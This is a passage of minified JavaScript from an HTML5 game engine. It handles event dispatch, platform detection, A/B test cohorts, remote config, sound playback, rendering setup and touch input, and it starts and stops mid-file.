    }, !1), document.addEventListener && document.addEventListener("ontouchmove", function(e) {
        e && e.preventDefault()
    }, !1), Array.from || (Array.from = function(e) {
        return [].slice.call(e)
    }), Math.hypot || (Math.hypot = function() {
        for (var e = 0, t = arguments.length; t--;) e += arguments[t] * arguments[t];
        return Math.sqrt(e)
    });
var requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || function(e) {
    return setTimeout(e, 1e3 / 60)
};
window.ga || (window.ga = function() {}), window.gax || (window.gax = function() {});
var eventTypes = {
    cached: {
        name: "cached",
        events: void 0
    },
    forced: {
        name: "forced",
        events: ["resize", "login", "login-error", "save", "logout", "FBInstantStart", "FBInstantComplete", "mutemusic", "mutesound", "dataloaded", "datasaved"]
    },
    transient: {
        name: "transient",
        events: ["down", "rightdown", "up", "rightup", "move", "tick", "animate", "render"]
    }
};

function sanitizeEventOpts(e, t) {
    return (t = t || {}).eventType && t.eventType in eventTypes || (t.eventType = eventTypes.cached.name, eventTypes.forced.events.indexOf(e) > -1 ? t.eventType = eventTypes.forced.name : eventTypes.transient.events.indexOf(e) > -1 && (t.eventType = eventTypes.transient.name)), t.freezeGroup = t.freezeGroup || this._defFrzGrp, t
}

function _onMethod(e, t, i) {
    this.emit("eventAttached", {
        eventName: e
    }), this.__listeners = this.__listeners || {}, this.__listeners[e] = this.__listeners[e] || [];
    var n = {
        callback: t,
        frzGrp: (i = sanitizeEventOpts(e, i)).freezeGroup,
        eventType: i.eventType
    };
    return this.__listeners[e].push(n), this
}
Object.defineProperty(Object.prototype, "on", {
        enumerable: !1,
        get: function() {
            return this.___on || _onMethod
        },
        set: function(e) {
            this.___on = e
        }
    }), Object.defineProperty(Object.prototype, "emit", {
        enumerable: !1,
        value: function(e, t) {
            var i = (this.__listeners || {})[e];
            if (i && i.length) {
                for (var n = [], r = 0; r < i.length; r++) n.push(i[r]);
                for (r = 0; r < n.length; r++) {
                    var o = {
                        name: e,
                        cbData: t,
                        frzGrp: n[r].frzGrp,
                        type: n[r].eventType
                    };
                    try {
                        void 0 !== this._freezeEmit && this._freezeEmit(o) || n[r].callback.call(this, t)
                    } catch (t) {
                        window.onerror && window.onerror(t.toString(), "Event: " + e, t.line, t.column, ""), console.error(t.toString(), "Event: " + e, t.line, t.column, "Failure in", n[r])
                    }
                }
            }
            return this
        },
        writable: !0
    }), Object.defineProperty(Object.prototype, "off", {
        enumerable: !1,
        value: function(e, t, i) {
            i = sanitizeEventOpts(e, i);
            for (var n = (this.__listeners || {})[e] || [], r = 0; r < n.length; r++)(n[r].callback === t && n[r].frzGrp === i.freezeGroup || void 0 === t) && n.splice(r--, 1);
            return n.length || delete(this.__listeners || {})[e], this.emit("eventRemoved", {
                eventName: e
            }), this
        },
        writable: !0
    }), Object.defineProperty(Object.prototype, "once", {
        enumerable: !1,
        value: function(e, t, i) {
            return i = sanitizeEventOpts(e, i), this.on(e, function n(r) {
                this.off(e, n, i), t.call(this, r)
            }, i), this
        },
        writable: !0
    }), Object.defineProperty(Function.prototype, "expand", {
        enumerable: !1,
        value: function(e) {
            return e.prototype = Object.create(this.prototype), e.prototype.constructor = e, e
        }
    }),
    function(e) {
        e.XS = e.XS || {};
        var t = e.XS;
        t.LOG_SPAM_EVENT_EXCLUDE = t.LOG_SPAM_EVENT_EXCLUDE || [], t.LOG_SPAM_EVENT_EXCLUDE.push("resize");
        var i = getRenderer();
        getRenderer = void 0, e.width = 150, e.height = 150, t.on("gameLoaded", function() {
            t.is.facebookInstant && "undefined" != typeof FBInstant && FBInstant.logEvent && (i.frvrGLErrors.TOTAL_ERRORS > 0 && FBInstant.logEvent("webgl_errors", 1, {
                OUT_OF_MEMORY: i.frvrGLErrors.OUT_OF_MEMORY,
                INVALID_ENUM: i.frvrGLErrors.INVALID_ENUM,
                INVALID_VALUE: i.frvrGLErrors.INVALID_VALUE,
                INVALID_OPERATION: i.frvrGLErrors.INVALID_OPERATION,
                INVALID_FRAMEBUFFER_OPERATION: i.frvrGLErrors.INVALID_FRAMEBUFFER_OPERATION,
                CONTEXT_LOST_WEBGL: i.frvrGLErrors.CONTEXT_LOST_WEBGL
            }), FBInstant.logEvent("pixi_renderer", 1, {
                renderer: t.is.usingCanvasRenderer ? "canvas" : t.is.usingWebGLRenderer ? "webgl" : "unknown"
            }))
        }), t.modulesToPreload = [], t.ignoreCursorChanges = !1, t.dirty = !1;
        var n, r = {},
            o = {
                _textureCache: {}
            };

        function a(e) {
            this.name = e, this.frc = 0, this.handlers = {}
        }

        function s() {
            return t.isFrozen(a.GLB_GRP_NAME)
        }
        Host.Log("User Agent: " + navigator.userAgent), t.assets = {}, t.assets.loadAsync = function(t, i) {
            var n = t.slice(0);
            n.push(function() {
                i && i(t)
            }), e.preload.apply(window, n)
        }, t.is = new function(e, t, i, n) {
            var r, o = this;
            o.android = /(android)/i.test(i) && !/(Windows)/i.test(i), o.androidVersion = (r = navigator.userAgent.toLowerCase().match(/android\s([0-9\.]*)/), parseFloat(r ? r[1] : 0)), o.firefoxMobile = /(Mobile)/i.test(i) && /(Firefox)/i.test(i), o.slow = o.android && o.androidVersion < 5, o.iOS = /(ipod|iphone|ipad)/i.test(i), o.windowsMobile = /(IEMobile)/i.test(i), o.silk = /(silk)/i.test(i), o.clay = /(clay\.io)/i.test(n), o.facebookApp = /(fb_canvas)/i.test(n), o.facebookAppWeb = /(fb_canvas_web)/i.test(n), o.iframed = e.top !== e.self, o.standalone = "standalone" in t && t.standalone, o.mobileiOSDevice = i.match(/iPhone/i) || i.match(/iPod/i), o.kongregate = /(kongregateiframe)/i.test(n), o.kik = /(kik_canvas)/i.test(n), o.twitter = /(twitter)/gi.test(i), o.chrome = /Chrome\//.test(i), o.safari = !!navigator.userAgent.match(/Version\/[\d\.]+.*Safari/), o.secureConnection = 0 == window.location.protocol.indexOf("https"), o.facebookInstant = window.Host && "instant" == window.Host.Type, o.spilGamesWrapper = /(spilgames)/i.test(n), o.partnerGamesWrapperId = Host.Web.GetQueryString("partnerid"), o.social = "on" == Host.Web.GetQueryString("social"), o.advertisementIsDisabled = "off" == Host.Web.GetQueryString("ads"), o.advertisementInterstitialDisabled = "off" == Host.Web.GetQueryString("int"), o.advertisementOverlayEnabled = !o.iframed || o.spilGamesWrapper || o.partnerGamesWrapperId, o.nosoc = "1" == Host.Web.GetQueryString("nosoc"), o.facebookAd = /(\/\?fb)/i.test(n), o.mobile = o.android || o.windowsMobile || o.iOS || o.silk || o.firefoxMobile, o.iOSWrapper = e.iOSWrapper || !1, o.iPhoneXOrLater = "true" == Host.Web.GetQueryString("iPhoneXOrLater"), o.iMessageContext = "true" == Host.Web.GetQueryString("iMessage"), o.androidWrapper = e.androidWrapper || !1, o.chromeWrapper = e.isChromeWrapper || !1, o.appWrapper = e.iOSWrapper || e.androidWrapper, o.samsungAppStore = "samsung" == Host.Web.GetQueryString("androidStore"), o.usingWebGLRenderer = !1, o.usingCanvasRenderer = !1, o.twitch = "" == Host.Web.GetQueryString("twitch"), o.vkru = "" == Host.Web.GetQueryString("vkru"), o.okru = "" == Host.Web.GetQueryString("okru"), o.pwa = "" == Host.Web.GetQueryString("pwa"), o.windowsApp = "" == Host.Web.GetQueryString("windowsapp"), o.enableAppStoreLinks = !0, o.samsungGalaxyStorePWA = "" == Host.Web.GetQueryString("samsung") && "galaxystore" == Host.Web.GetQueryString("source"), o.samsungGameLauncherPWA = ("" == Host.Web.GetQueryString("pwa") || "" == Host.Web.GetQueryString("samsung")) && "gamelauncher" == Host.Web.GetQueryString("source"), o.samsungBixby = "" == Host.Web.GetQueryString("samsung") && !o.samsungGalaxyStorePWA, o.samsungBrowserUK = "" == Host.Web.GetQueryString("samsungbuk"), o.samsungBrowserUS = "" == Host.Web.GetQueryString("samsungbus"), o.samsungBrowserSEA = "" == Host.Web.GetQueryString("samsungbsea"), o.samsungBrowser = "" == Host.Web.GetQueryString("samsungbrowser"), o.rcs = Host.Web.GetQueryString("rcsid"), o.huawei = "" == Host.Web.GetQueryString("huawei"), o.mozilla = "" == Host.Web.GetQueryString("mozilla"), o.miniclip = "" == Host.Web.GetQueryString("miniclip"), o.chromeOSDevice = "true" == Host.Web.GetQueryString("isChromeOSDevice"), o.progressiveWebAppEnabled = !(o.chromeOSDevice || o.iframed || o.appWrapper || o.twitch || o.vkru || o.okru || o.facebookInstant), o.opera = !!e.opr && !!e.opr.addons || !!e.opera || i.indexOf(" OPR/") >= 0, o.firefox = void 0 !== e.InstallTrigger, o.edge = /(edge|edgios|edga)\/((\d+)?[\w\.]+)/i.test(i)
        }(window, navigator, navigator.userAgent, document.location), t.abtest = new function() {
            var e = this;
            e.initialized = !1, e.forcedCohorts = {}, e.abTestCohorts = {}, e.validCohorts = {};
            var i = [],
                r = function() {
                    for (var e = [], t = 0; 64 > t;) e[t] = 0 | 4294967296 * Math.abs(Math.sin(++t));
                    return function(t) {
                        for (var i, n, r, o, a = [], s = (t = unescape(encodeURI(t))).length, l = [i = 1732584193, n = -271733879, ~i, ~n], h = 0; h <= s;) a[h >> 2] |= (t.charCodeAt(h) || 128) << h++ % 4 * 8;
                        for (a[t = 16 * (s + 8 >> 6) + 14] = 8 * s, h = 0; h < t; h += 16) {
                            for (s = l, o = 0; 64 > o;) s = [r = s[3], (i = 0 | s[1]) + ((r = s[0] + [i & (n = s[2]) | ~i & r, r & i | ~r & n, i ^ n ^ r, n ^ (i | ~r)][s = o >> 4] + (e[o] + (0 | a[[o, 5 * o + 1, 3 * o + 5, 7 * o][s] % 16 + h]))) << (s = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21][4 * s + o++ % 4]) | r >>> 32 - s), i, n];
                            for (o = 4; o;) l[--o] = l[o] + s[o]
                        }
                        for (t = ""; 32 > o;) t += (l[o >> 3] >> 4 * (1 ^ 7 & o++) & 15).toString(16);
                        return t
                    }
                }();
            e.setup = function(e) {
                return i.push(e), {
                    fallback: function(e) {
                        n || e()
                    }
                }
            }, e.force = function(e, t) {
                console.warn("Forcing cohort: " + t + " for test: " + e), this.forcedCohorts[e] = t
            }, e.addTest = function(e, i, n, o) {
                this.validCohorts[i] = n;
                var a, s, l, h, d = this.forcedCohorts[i];
                return d || (d = n[(a = e, s = i, l = n.length, h = r(s + ":" + a).substr(-8), parseInt(h, 16) % l)]), this.abTestCohorts[i] = d, o && "{}" !== JSON.stringify(this.abTestCohorts) && t.track.customEvent(i, 1, this.abTestCohorts), {
                    test: i,
                    cohort: d
                }
            }, e.init = function(n, r) {
                var o = {};
                if (window._jsonData && window._jsonData.ab_tests) {
                    var a = r || window._jsonData.ab_tests;
                    for (var s in a) {
                        var l = this.addTest(n, s, a[s].cohorts, !1);
                        o[l.test] = l.cohort
                    }
                    for (s in console.log("XS.abtest: A/B test cohorts: ", o), a) t.track.customEvent(s, 1, o)
                }
                e.initialized = !0;
                for (var h = 0; h < i.length; ++h) i[h]();
                e.emit("abtest-init")
            }, e.cohort = function(t) {
                return e.initialized || console.error("XS.abtest.cohort called before XS.abtest was initialized!"), e.abTestCohorts[t]
            }, e.when = function(t, i, r) {
                if (!n) return {
                    fallback: function(e) {
                        e && e()
                    }
                };
                e.initialized || console.error("XS.abtest.when called before XS.abtest was initialized!");
                var o = this.cohort(t);
                return "string" == typeof i ? o && i && o == i && r && r() : "object" == typeof i ? o && i[o] && i[o]() : o || console.error("No A/B test cohort defined for test '" + t + "' - nothing was executed!"), {
                    fallback: function() {}
                }
            }
        }, t.is.facebookInstant ? (Host.on("FBInstantStart", function() {
            t.abtest.init(FBInstant.player.getID())
        }), n = !0) : n = !1, t.loadEmbedData = function(e, t, i) {
            if (window.embeddedFiles && window.embeddedFiles[e]) console.log("Loading embedded data: " + e), t(window.embeddedFiles[e]);
            else {
                console.warn("Loading data (not embedded!): " + e);
                var n = new XMLHttpRequest;
                n.crossOrigin = "anonymous", i && n.overrideMimeType && n.overrideMimeType(i);
                try {
                    n.open("GET", e, !0), n.onreadystatechange = function() {
                        4 == n.readyState && ("200" == n.status ? t(n.responseText) : (n = n.onreadystatechange = null, console.error("XS.loadData: Error loading data: ", n)))
                    }, n.send()
                } catch (e) {
                    console.error("loadEmbedData: Error loading data (2): ", e)
                }
            }
        }, window.insertButton = function(e, t, i) {
            console.warn("window.insertButton needs to be overwritten before releasing this game."), Host.WrapperLog("window.insertButton is not defined")
        }, a.nextHandlerId = 1, a.groups = {}, a.cachedEvents = [], a.ENG_GRP_NAME = "___e", e.ENG_FRZ_GRP = a.ENG_GRP_NAME, a.DEF_GRP_NAME = "___d", Object.defineProperty(Object.prototype, "_defFrzGrp", {
            enumerable: !1,
            value: a.DEF_GRP_NAME
        }), a.GLB_GRP_NAME = "___g", a.groups[a.GLB_GRP_NAME] = new a(a.GLB_GRP_NAME), a.get = function(e) {
            return a.groups[e] = a.groups[e] || new a(e), a.groups[e]
        }, a.freezeUnfreezeGroup = function(e, t) {
            var i = t ? 1 : -1,
                n = a.get(e);
            for (var r in n.frc = Math.max(0, n.frc + i), n.handlers) n.handlers[r].frc = Math.max(0, n.handlers[r].frc + i)
        }, a.addHandler = function(e, t) {
            for (var i = 0; i < t.length; i++) {
                var n = a.get(t[i]);
                n.handlers[e.id] = e, n.frc > 0 && e.frc++
            }
        }, a.removeHandler = function(e) {
            for (var t in a.groups) {
                var i = a.get(t);
                delete i.handlers[e.id], i.frc > 0 && e.frc--
            }
        }, a.cacheEvent = function(e, t, i, n) {
            a.cachedEvents.push({
                target: e,
                eventName: t,
                grpName: i,
                cbData: n
            })
        }, a.fireCachedEvents = function(e) {
            for (var t = a.cachedEvents.length; t--;) {
                var i = a.cachedEvents[t];
                i.grpName === e && (i.target.emit(i.eventName, i.cbData), a.cachedEvents.splice(t, 1))
            }
        }, t.LOG_SPAM_EVENT_EXCLUDE = t.LOG_SPAM_EVENT_EXCLUDE || [], Object.defineProperty(Object.prototype, "_freezeEmit", {
            enumerable: !1,
            value: function(e) {
                return e.type !== eventTypes.forced.name && (!(!s() && !t.isFrozen(e.frzGrp)) && (e.type === eventTypes.transient.name || a.cacheEvent(this, e.name, e.frzGrp, e.cbData), !0))
            }
        }), a.prototype.constructor = a, t.isFrozen = function(e) {
            return (e = e || a.DEF_GRP_NAME) in a.groups && a.get(e).frc > 0
        }, t.freeze = function(e) {
            e = e || a.DEF_GRP_NAME, a.freezeUnfreezeGroup(e, !0)
        }, t.unfreeze = function(e) {
            e = e || a.DEF_GRP_NAME, a.freezeUnfreezeGroup(e, !1), a.fireCachedEvents(e)
        }, t.canvas = document.getElementById("gameCanvas"), t.stageContainer = new i.Stage(2105376), L(t.stageContainer), t.stageContainer.on("up", function(e) {
            t.stageContainer.emit("stageup", e)
        }, {
            freezeGroup: ENG_FRZ_GRP
        }), t.stageContainer.on("down", function(e) {
            window.focus && window.focus()
        }, {
            freezeGroup: ENG_FRZ_GRP
        });
        var l = !1;
        t.is.android && t.is.androidVersion < 5 && !t.is.firefoxMobile && (l = !0);
        var h = window.__antialias;
        window.inScreenshotMode || l ? t.renderer = new i.CanvasRenderer(width, height, {
            view: t.canvas,
            antialiasing: !1,
            antialias: !1,
            transparent: !1,
            clearBeforeRender: !0
        }) : t.renderer = i.autoDetectRenderer(width, height, {
            view: t.canvas,
            antialiasing: h,
            antialias: h,
            transparent: !1,
            clearBeforeRender: !0
        }), t.is.usingCanvasRenderer = t.renderer.type === i.CANVAS_RENDERER, t.is.usingWebGLRenderer = t.renderer.type === i.WEBGL_RENDERER, t.httpPrefix = "https://", t.devicePixelRatio = Math.min(2, window.devicePixelRatio || 1), t.styles = {
            margins: {
                top: (t.is.iOSWrapper || t.is.standalone) && t.is.iOS ? t.is.iPhoneXOrLater ? 0 : 20 : 0,
                bottom: 0,
                left: 0,
                right: 0
            },
            spacing: {
                top: 0,
                bottom: 0,
                left: 0,
                right: 0
            }
        }, t.showGameOverAd = function() {}, t.hideGameOverAd = function() {}, t.showInterstitialAd = function(e) {
            e && e()
        }, t.resizeAd = function() {}, t.showRateGame = function() {}, t.submitHighscore = function(e) {}, t.submitLowscore = function(e) {}, t.configLoadCallback = function() {}, t.insertRemoveAdsButton = function() {}, t.removeAdsButton = function() {};
        var d, c = !1;
        t.skipResizing = !1, window.onresize = function(e) {
            if (!t.skipResizing) {
                var i = 5;
                LEGACY_COORD_SYSTEM && (i = 25), clearTimeout(c), clearInterval(d), clearTimeout(Ae), c = setTimeout(function() {
                    ke({
                        instant: !1,
                        event: e
                    }), d = setInterval(function() {
                        Ie(!1)
                    }, 250)
                }, i)
            }
        }, window.onfocus = function(e) {
            t.emit("focus", {
                event: e
            })
        }, window.onblur = function(e) {
            t.emit("blur", {
                event: e
            })
        }, document.addEventListener("visibilitychange", function(e) {
            "hidden" == document.visibilityState && t.emit("blur", {
                event: e
            }), "visible" == document.visibilityState && t.emit("focus", {
                event: e
            })
        });
        var u = [];
        var f, p, g, v = function() {
            var e = 0;
            if (window.Host && window.Host.Sound) return Host.Log("Using SoundPlayer!"),
                function(t) {
                    t = !!t;
                    var i = this;
                    this.muted = !1, this.setMuted = function(e) {
                        i.muted = e, Host.Sound.PauseAll(e, t)
                    }, this.soundNodes = [], this.get = function(n, r) {
                        var o = n + "_" + e++;
                        return Host.Sound.Preload(o, n, t), new function(e, n, r) {
                            var o = this;
                            o.playing = !1;
                            var a = r;
                            o.resetGain = function() {
                                o.setGain(r)
                            }, o.setGain = function(t) {
                                a = t, Host.Sound.SetVolume(e, t)
                            }, o.updateGain = function(e) {
                                r = e, o.setGain(e)
                            }, o.currentGain = function() {
                                return o.currentGain
                            }, o.setMuted = function(t) {
                                Host.Sound.Pause && o.playing && Host.Sound.Pause(e, t)
                            }, o.play = function(r, s) {
                                function l() {
                                    Host.Sound.Play(e, n, s, a, t)
                                }
                                i.muted || t && o.playing || (o.playing = !0, r ? setTimeout(l, 1e3 * r) : l())
                            }, o.stop = function(t) {
                                t = void 0 === t ? 0 : t, o.playing = !1, Host.Sound.Stop(e)
                            }
                        }(o, n, r)
                    }
                };
            var i = !1;
            return function(n) {
                var r, o = this;
                void 0 !== v.context && (r = v.context);
                var a = window.AudioContext || window.webkitAudioContext;
                void 0 === r && void 0 !== a && (r = new a), this.unblock = function() {
                    if (!i && o.unblocker) {
                        var e = r.state;
                        o.unblocker.play(0, !1), e != r.state && (i = !0, t.backgroundMusic && t.backgroundMusic.play(0, !0, !0))
                    }
                }, this.debug = function() {
                    console.log(r)
                };
                var s = [];
                this.soundNodes = [], this.muted = !1, this.setMuted = function(e) {
                    o.muted = e, e || function() {
                        for (; u.length;) u.pop()()
                    }();
                    try {
                        for (var t = 0; t < this.soundNodes.length; ++t) this.soundNodes[t] && this.soundNodes[t].setMuted(e)
                    } catch (e) {}
                }, this.unblocker = void 0, this.get = function(e, t) {
                    var i = s[e] || f(e, t);
                    return i.updateGain(t), void 0 !== o.unblocker || n || (o.unblocker = f(e, 0)), this.soundNodes.push(i), i
                };
                var l = [],
                    h = !1;

                function d() {
                    h = !0, l.length ? l.shift()() : h = !1
                }

                function c(i, a) {
                    this.id = i + "_" + e++;
                    var s, c, f = this;
                    f.loaded = !1, f.playing = !1;
                    var p = {
                        gain: {
                            value: a
                        }
                    };
                    if (r) {
                        u.push(function() {
                            var e = new XMLHttpRequest;

                            function t(e) {
                                console.error('Error loading sound "%s":', i, e), d()
                            }
                            e.open("GET", vpath + i, !0), e.responseType = "arraybuffer", e.onerror = t, e.onload = function() {
                                200 !== e.status && t(e.status + "/" + e.statusText), r.decodeAudioData(e.response, function(t) {
                                    s = t, f.loaded = !0, c && c(), e = null, d()
                                }, t)
                            }, l.push(function() {
                                e.send()
                            }), h || (d(), n || d())
                        }), p = r.createGain ? r.createGain() : {
                            gain: {
                                value: a
                            }
                        }
                    }
                    this.gain = p.gain;
                    var g = {},
                        v = 0;

                    function m() {
                        for (var e in g) return e;
                        return !1
                    }

                    function y(e) {
                        !1 === m() && (v = f.gain.value, f.setGain(0)), g[e] = !0
                    }

                    function w(e) {
                        var t = m();
                        delete g[e], !1 !== t && f.setGain(v)
                    }
                    this.setGain = function(e) {
                        m() ? v = e : this.gain.value = e
                    }, this.updateGain = function(e) {
                        m() ? v = a = e : this.gain.value = a = e
                    }, this.resetGain = function() {
                        m() ? v = a : this.gain.value = a
                    }, f.currentGain = function() {
                        return this.gain.value
                    }, this.getCurrentTime = function() {
                        return r ? r.currentTime : 0
                    };
                    var S = void 0;
                    this.play = function(e, t, i) {
                        if (f.loaded) {
                            if (n) {
                                if (f.playing && !i) return
                            } else f.stop(0);
                            ! function(e, t) {
                                if (!o.muted && f.loaded) {
                                    S = {
                                        stop: function() {}
                                    };
                                    try {
                                        f.playing = !0, (S = r.createBufferSource()).buffer = s, S.loop = t || !1, f.resetGain(), S.connect(p), p.connect(r.destination), S.start(r.currentTime + (e || 0))
                                    } catch (e) {}
                                }
                            }(e, t)
                        } else n && (c = function() {
                            var i = f.gain.value;
                            f.play(e, t), f.setGain(i)
                        })
                    }, this.stop = function(e) {
                        if (e = e || 0, S && f.playing) try {
                            S.stop(e)
                        } catch (e) {}
                        f.playing = !1
                    }, this.setMuted = function(e) {
                        e ? y("__default") : w("__default")
                    }, t.on("blur", function(e) {
                        y(f.id || "__default")
                    }, {
                        freezeGroup: ENG_FRZ_GRP
                    }), t.on("focus", function(e) {
                        w(f.id || "__default")
                    }, {
                        freezeGroup: ENG_FRZ_GRP
                    }), window.stage && stage.on("down", function(e) {
                        w(f.id || "__default")
                    }, {
                        freezeGroup: ENG_FRZ_GRP
                    })
                }

                function f(e, t) {
                    return s[e] = new c(e, t)
                }
                this.currentTrack = null
            }
        }();

        function m() {
            if (t.backgroundMusic && t.soundSettings) {
                var e = t.soundSettings.muteMusic.get();
                t.Music.setMuted(e), e ? t.backgroundMusic.stop(0) : t.backgroundMusic.play(0, !0)
            }
        }
        t.Sound = new v, t.Music = new v(!0), t.backgroundMusic = null, t.muteMusic = function(e) {
            t.Music.setMuted(e), t.soundSettings && t.soundSettings.muteMusic.set(e), m(), t.emit("mutemusic", e)
        }, t.muteSound = function(e) {
            t.soundSettings && t.soundSettings.muteSound.set(e), t.Sound.setMuted(e), t.emit("mutesound", e)
        }, t.setBackgroundMusic = function(e, i) {
            var n = null;
            return "string" == typeof e ? n = t.Music.get(e, i || 1) : (n = e, i ? n.setGain(i) : n.resetGain()), t.backgroundMusic = n, m(), n
        }, t.initSound = function() {
            t.soundSettings = {
                legacyMuteSounds: Host.Preferences.QuickBool("sound.v1"),
                legacyMuteMusic: Host.Preferences.QuickBool("music.v1"),
                muteSound: Host.Preferences.QuickBool("xs.muteSound.v1"),
                muteMusic: Host.Preferences.QuickBool("xs.muteMusic.v1"),
                muteStateOverload: Host.Preferences.QuickBool("xs.muteStateOverload.v1")
            }, t.is.progressiveWebAppEnabled && !t.soundSettings.muteStateOverload.get() && (t.soundSettings.muteStateOverload.set(!0), t.soundSettings.legacyMuteSounds.set(!t.soundSettings.legacyMuteSounds.get()), t.soundSettings.legacyMuteMusic.set(!t.soundSettings.legacyMuteMusic.get()), t.soundSettings.muteSound.set(!t.soundSettings.muteSound.get()), t.soundSettings.muteMusic.set(!t.soundSettings.muteMusic.get())), t.Music && t.Music.setMuted(t.soundSettings.muteMusic.get()), t.Sound && t.Sound.setMuted(t.soundSettings.muteSound.get()), m()
        }, t.muteAll = function() {
            if (window.Host && window.Host.Sound) window.Host.Sound.MuteAll();
            else {
                if (f) return;
                f = !0, p = t.soundSettings.muteSound.get(), g = t.soundSettings.muteMusic.get(), t.backgroundMusic && void 0 === t.backgroundMusic.__preMuteGain && (t.backgroundMusic.__preMuteGain = t.backgroundMusic.currentGain()), t.muteMusic(!0), t.muteSound(!0)
            }
        }, t.unmuteAll = function() {
            if (window.Host && window.Host.Sound) window.Host.Sound.UnmuteAll();
            else {
                if (!f) return;
                f = !1, t.muteMusic(g), t.muteSound(p), t.backgroundMusic && void 0 !== t.backgroundMusic.__preMuteGain && (t.backgroundMusic.setGain(t.backgroundMusic.__preMuteGain), delete t.backgroundMusic.__preMuteGain)
            }
        }, t.loadScript = function(e, t) {
            var i, n, r;
            i = document, r = i.getElementsByTagName("script")[0], t = t || {}, (n = i.createElement("script")).src = e, n.async = "async", n.defer = "defer", t.charset && (n.charset = t.charset), r.parentNode.insertBefore(n, r)
        }, t.waitForSDK = function(e, t) {
            var i = setInterval(function() {
                if (window[e]) return clearInterval(i), t()
            }, 100)
        }, t.util = {}, t.util.urlKeyVal = function(e, t) {
            return encodeURIComponent(e) + "=" + encodeURIComponent(t)
        }, t.util.urlEncode = function(e) {
            var i = [];
            for (key in e) i.push(t.util.urlKeyVal(key, e[key]));
            return i.join("&")
        }, t.remoteConfig = {};
        var y = !1;
        t.loadConfig = function(e) {
            if (!y && !t.is.facebookInstant && !t.is.twitch) {
                var i = Config.remoteConfigVersion;
                if (t.is.iOS ? i += ".ios" : t.is.android && !t.is.silk ? i += ".android" : t.is.chromeWrapper ? i += ".chrome" : t.is.facebookInstant && (i += ".instant"), void 0 !== Config && Config.stage && "live" != Config.stage && "gold" != Config.stage && "beta" != Config.stage && "rc" != Config.stage) Host.WrapperLog("Skipping ad config loading, because of Config.stage"), console.warn("Skipping ad config loading, because of Config.stage");
                else {
                    var n = t.httpPrefix + "./" + e + "." + i + ".json?r=" + (new Date).getTime();
                    Host.Tools.LoadJSON(n, function(e) {
                        for (var i in Host.WrapperLog("Loading Config URL: " + n), e) t.remoteConfig[i] = e[i];
                        t.configLoadCallback()
                    }, function() {
                        Host.WrapperLog("Failed to load config: " + n), setTimeout(function() {
                            t.loadConfig(e)
                        }, 6e4)
                    })
                }
                Host.Log(t.httpPrefix + "./" + e + "." + i + ".json?r="), y = !0
            }
        }, t.navigate = function(e, i) {
            window.Host && window.Host.IOS && window.Host.IOS.OpenURL && Host.IOS.OpenURL(e), window.Host && window.Host.Android && window.Host.Android.OpenURL ? window.Host.Android.OpenURL(e) : t.is.clay ? (window.open(e, i || "_blank"), navigator.app && navigator.app.loadUrl && navigator.app.loadUrl(e, {
                openExternal: !0
            })) : window.open(e, i || "_blank")
        }, t.utils = {};
        var w = 0;
        t.utils.clipImage = function(e, t, n, a, s, l, h) {
            e.isJSG && (e = i.Texture.getScaled(e, 1, o, !0).canvas), l = l || a, h = h || s, e.path = e.path || e.src || "Unknown Canvas Object " + ++w;
            var d = [e.path, t, n, a, s, l, h].join(","),
                c = r[d];
            return void 0 === c && ((c = getNewCanvasObject()).width = a, c.height = s, c.path = d, c.getContext("2d").drawImage(e, t, n, a, s, 0, 0, l, h), r[d] = c), c
        }, t.utils.asynchLoadImageFromPath = function(e) {
            var t = i.Sprite.fromImage(e);
            return L(t), t
        };
        var S = !1;

        function b(e, t, i) {
            window.dirty = !0, e.emit("down", {
                event: t,
                isMouseEvent: i
            })
        }

        function _(e) {
            t.is.chromeOSDevice || (S = !0, this.mousedown = void 0), b(this, e, !1)
        }

        function T(e) {
            S || b(this, e, !0)
        }

        function C(e, i, n) {
            window.dirty = !1, e.emit("up", {
                event: i,
                isMouseEvent: n
            }), t.is.iOS && !t.is.appWrapper && t.Sound.unblock()
        }

        function R(e) {
            t.is.chromeOSDevice || (S = !0, this.mouseup = void 0), C(this, e, !1)
        }

        function M(e) {
            S || C(this, e, !0)
        }

        function E(e, t, i) {
            e.emit("move", {
                event: t,
                isMouseEvent: i
            })
        }

        function A(e) {
            t.is.chromeOSDevice || (S = !0, this.mouseup = void 0), E(this, e, !1)
        }

        function P(e) {
            S || E(this, e, !0)
        }

        function L(e) {
            e.on("eventAttached", function(t) {
                switch (t.eventName) {
                    case "down":
                        (a = e).interactive = !0, a.__touchStartEnabled || (a.__touchStartEnabled = !0, a.touchstart = _, a.mousedown = T);
                        break;
                    case "up":
                        (o = e).interactive = !0, o.__touchEndEnabled || (o.__touchEndEnabled = !0, o.mousedown = o.mousedown || function() {}, o.touchstart = o.touchstart || function() {}, o.touchendoutside = o.touchend = R, o.mouseupoutside = o.mouseup = M);
                        break;
                    case "move":
                        (r = e).interactive = !0, r.__touchMoveEneabled || (r.__touchMoveEneabled = !0, r.touchmove = A, r.mousemove = P);
                        break;
                    case "rightdown":
                        (n = e).interactive = !0, n.__rightDownEnabled || (n.__rightDownEnabled = !0, n.rightdown = function(e) {
                            this.emit("rightdown", {
                                event: e,
                                isMouseEvent: !0
                            })
                        });
                        break;
                    case "rightup":
                        (i = e).interactive = !0, i.__rightUpEnabled || (i.__rightUpEnabled = !0, i.rightup = function(e) {
                            this.emit("rightup", {
                                event: e,
                                isMouseEvent: !0
                            })
                        })
                }
                var i, n, r, o, a
            }, {
                freezeGroup: ENG_FRZ_GRP
            })
        }
        var G = 0;

        function I(e, t) {
            G = 2;
            var i = function e(t, i) {
                for (; i < .5;) t = e(t, .5), i /= .5;
                G *= i, G += 2;
                var n = getNewCanvasObject(),
                    r = n.getContext("2d"),
                    o = Math.ceil(t.width * i) || 1,
                    a = Math.ceil(t.height * i) || 1;
                return n.width = o + 4, n.height = a + 4, r.clearRect(0, 0, n.width, n.height), r.drawImage(t, 0, 0, t.width, t.height, 2, 2, o, a), n
            }(e, t);
            G = Math.round(G) - 2;
            var n = Math.round(e.width * t) + 4,
                r = Math.round(e.height * t) + 4;
            return canvas = getNewCanvasObject(), canvas.width = n, canvas.height = r, canvas.getContext("2d").drawImage(i, 0, 0, i.width, i.height, -G, -G, i.width, i.height), releaseCanvas(i), canvas
        }

        function O(e) {
            e && (e.removeEventListener("load", F), e.removeEventListener("error", X))
        }

        function F(e) {
            O(e.target), window.dirtyOnce = !0
        }

        function X(e) {
